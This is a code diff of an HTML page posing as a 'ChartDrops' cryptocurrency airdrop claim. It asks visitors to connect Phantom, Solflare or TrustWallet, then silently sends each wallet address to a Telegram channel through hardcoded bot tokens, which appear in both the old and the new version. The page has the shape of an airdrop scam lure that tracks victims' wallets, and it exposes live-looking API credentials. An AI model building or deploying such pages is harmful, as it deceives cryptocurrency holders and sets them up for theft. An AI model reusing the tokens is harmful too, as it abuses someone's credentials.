@@ -1,123 +1,128 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Airdrop Connect</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8" />
+  <title>ChartDrops Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.9.19/lib/cdn/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.19/lib/cdn/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react-ui/styles.css"></script>
   <style>
     body {
-      0;
-      'Segoe UI', sans-serif;
-      background: #0a0a0a;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      background: #0d0d0d;
+      color: white;
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 80px;
     }
-    .button {
-      background: #00ffa3;
-      color: #000;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    .button:hover {
-      background: #00c27f;
-    }
+
     .popup {
-      position: fixed;
-      display: none;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6);
-      justify-content: center;
-      align-items: center;
-    }
-    .popup-content {
-      background: #1b1b1b;
+      background: #1a1a1a;
       padding: 25px;
       border-radius: 10px;
-      text-align: center;
-      width: 280px;
+      display: inline-block;
+      box-shadow: 0 0 15px rgba(0, 255, 150, 0.2);
     }
-    .wallet-option {
-      background: #282828;
-      10px 0;
-      padding: 12px;
+
+    button {
+      background: #00ffae;
+      border: none;
+      padding: 12px 20px;
+      margin: 10px;
       border-radius: 6px;
       cursor: pointer;
-      transition: background 0.2s ease;
+      color: black;
+      font-weight: bold;
     }
-    .wallet-option:hover {
-      background: #3a3a3a;
+
+    button:hover {
+      background: #00d69b;
     }
   </style>
 </head>
 <body>
-
-<button class="button" onclick="showPopup()">Claim Airdrop</button>
-
-<div class="popup" id="popup">
-  <div class="popup-content">
-    <h3>Connect Your Wallet</h3>
-    <div class="wallet-option" onclick="connectPhantom()">Phantom</div>
-    <div class="wallet-option" onclick="alert('Solflare coming soon')">Solflare</div>
-    <div class="wallet-option" onclick="alert('TrustWallet coming soon')">TrustWallet</div>
+  <div class="popup">
+    <h2>ChartDrops Airdrop</h2>
+    <p>Connect your wallet to claim</p>
+    <button onclick="connectPhantom()">Connect Phantom</button>
+    <button onclick="connectSolflare()">Connect Solflare</button>
+    <button onclick="connectTrust()">Connect TrustWallet</button>
   </div>
-</div>
 
-<script>
-  const BOT_TOKEN = "7675875616:AAEgBrKlJV1K2qgtEt69g8Kzs97YcBZvrBc";
-  const CHANNEL_ID = "-1002652189311"; // use dash
+  <script>
+    const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
+    const CHANNEL_ID = "-1002600871606";
 
-  function showPopup() {
-    document.getElementById("popup").style.display = "flex";
-  }
-
-  async function sendTelegramMessage(walletAddress) {
-    const message = `✅ Wallet ${walletAddress} Connected To chartdrops.fun`;
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: CHANNEL_ID,
-          text: message
-        })
-      });
-    } catch (err) {
-      console.error("Telegram Error:", err);
-    }
-  }
-
-  async function connectPhantom() {
-    // Extension (desktop)
-    if (window.solana && window.solana.isPhantom) {
+    async function sendTelegramMessage(walletAddress) {
+      const message = `✅ Wallet ${walletAddress} Connected To chartdrops.fun`;
       try {
-        const resp = await window.solana.connect();
-        const pubkey = resp.publicKey.toString();
-        console.log("Phantom Extension Connected:", pubkey);
-        await sendTelegramMessage(pubkey);
-        alert("Wallet Connected!");
-        document.getElementById("popup").style.display = "none";
-      } catch (err) {
-        console.error("Connection error:", err);
-      }
-    } else {
-      // Fallback to Phantom mobile deep link
-      const link = `https://phantom.app/ul/browse/${window.location.href}`;
-      alert("Phantom extension not found. Opening mobile app...");
-      window.location.href = link;
-    }
-  }
-</script>
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHANNEL_ID,
+            text: message
+          })
+        });
 
+        const result = await res.json();
+        console.log("Telegram Response:", result);
+
+        if (!res.ok || !result.ok) {
+          alert(`Telegram error: ${result.description || res.statusText}`);
+        }
+      } catch (err) {
+        console.error("Telegram send error:", err);
+      }
+    }
+
+    async function connectPhantom() {
+      if ('solana' in window) {
+        const provider = window.solana;
+        if (provider.isPhantom) {
+          try {
+            const resp = await provider.connect();
+            const walletAddress = resp.publicKey.toString();
+            sendTelegramMessage(walletAddress);
+            alert(`Connected: ${walletAddress}`);
+          } catch (err) {
+            console.error("Phantom connect error", err);
+          }
+        } else {
+          alert("Phantom extension not found.");
+        }
+      } else {
+        alert("Phantom not installed. Please install it.");
+      }
+    }
+
+    async function connectSolflare() {
+      try {
+        const solflare = new window.Solflare();
+        if (!solflare.isConnected) {
+          await solflare.connect();
+        }
+        const walletAddress = solflare.publicKey.toString();
+        sendTelegramMessage(walletAddress);
+        alert(`Connected: ${walletAddress}`);
+      } catch (err) {
+        alert("Solflare connection failed.");
+      }
+    }
+
+    async function connectTrust() {
+      if (window.solana && window.solana.isTrust) {
+        try {
+          const resp = await window.solana.connect();
+          const walletAddress = resp.publicKey.toString();
+          sendTelegramMessage(walletAddress);
+          alert(`Connected: ${walletAddress}`);
+        } catch (err) {
+          alert("TrustWallet connection failed.");
+        }
+      } else {
+        alert("TrustWallet not detected.");
+      }
+    }
+  </script>
 </body>
 </html>
-
